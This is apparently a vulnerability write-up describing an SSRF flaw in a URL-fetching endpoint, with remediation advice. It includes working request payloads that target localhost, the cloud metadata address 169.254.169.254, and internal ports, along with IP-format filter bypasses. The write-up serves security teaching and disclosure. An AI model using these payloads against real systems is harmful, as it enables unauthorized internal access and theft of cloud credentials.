# 🌐 SSRF Vulnerability Leading to Internal Resource Access

## 🧩 Summary

A Server-Side Request Forgery (SSRF) vulnerability was identified in a web application feature that fetches external URLs. By manipulating the request parameter, it was possible to force the server to make requests to internal resources, potentially exposing sensitive information.

---

## 🎯 Impact

* Access to internal services not exposed to the public
* Potential leakage of sensitive data (e.g., internal APIs, metadata)
* Possibility to escalate to further attacks depending on internal service exposure

---

## 🔍 Vulnerable Endpoint

```
GET /fetch?url=https://example.com/image.png
```

The application fetches and processes the provided URL on the server side.

---

## ⚙️ Steps to Reproduce

1. Intercept the request using Burp Suite:

```
GET /fetch?url=https://example.com/image.png HTTP/1.1
Host: target.com
```

2. Modify the `url` parameter to point to an internal resource:

```
GET /fetch?url=http://127.0.0.1:80 HTTP/1.1
Host: target.com
```

3. Observe the response:

* The server attempts to connect to localhost
* Response behavior differs from normal external requests

---

## 🧪 Advanced Exploitation

### Access Internal Metadata (Cloud Environment)

```
http://169.254.169.254/latest/meta-data/
```

### Internal Port Scanning

```
http://127.0.0.1:22
http://127.0.0.1:8080
```

### Bypass Techniques

* Use alternative IP formats:

```
http://127.1
http://0.0.0.0
```

* DNS rebinding or redirect chains

---

## 🛡️ Root Cause

The application does not validate or restrict user-supplied URLs before making server-side requests.

---

## 🔒 Remediation

* Implement strict allowlists for outbound requests
* Block internal IP ranges (127.0.0.1, 169.254.169.254, etc.)
* Disable unnecessary URL fetching functionality
* Use network-level protections (firewalls, metadata access restrictions)

---

## 🧠 Lessons Learned

* SSRF vulnerabilities can lead to high-impact internal access
* Always test URL-based features for server-side request behavior
* Combine SSRF with other vulnerabilities for maximum impact

---

## 📌 Notes

This vulnerability was identified during manual testing and reconnaissance of application endpoints.
